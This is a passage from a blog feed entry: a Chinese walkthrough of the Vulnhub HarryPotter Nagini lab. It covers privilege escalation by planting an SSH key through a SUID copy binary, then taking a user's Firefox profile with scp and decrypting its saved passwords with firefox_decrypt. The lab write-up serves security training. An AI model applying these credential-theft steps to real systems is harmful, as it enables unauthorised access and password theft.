src="https://raw.githubusercontent.com/chencicici/images/main/202211111724602.png"></p><p>尝试登录一下上面那个用户,登录成功,ssh交互式shell舒服一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111727579.png"></p><p>有suid的权限,直接复制ssh key到家目录直接免密登录</p><p>先在kali生公钥,在将公钥复制到snape家目录下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742676.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742248.png"></p><p>直接在家目录下新建文件,写入复制的内容,再使用su_cp复制到hermoine用户的ssh目录下(公钥文件权限只能是640)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111743364.png"></p><p>免密登录hermoine用户</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111745644.png"></p><p>在目录下发现一个隐藏文件夹,这个目录里面包含有火狐浏览器的扩展、用户信息，以及保存到账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111750069.png"></p><p>下载firefox信息提取工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unode/firefox_decrypt.git</span><br></pre></td></tr></table></figure><p>将隐藏文件夹传到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r hermoine@192.168.31.205:/home/hermoine/.mozilla/ /root/ </span><br></pre></td></tr></table></figure><p>然后运行脚本,脚本会自己去找&#x2F;root&#x2F;.mozilla 所以复制过来不需要改密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111757191.png"></p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111801009.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub靶场 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-nagini,68</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
    <category term="joomla cms" scheme="https://syst1m.top/tags/joomla-cms/"/>
    
  </entry>
  
</feed>
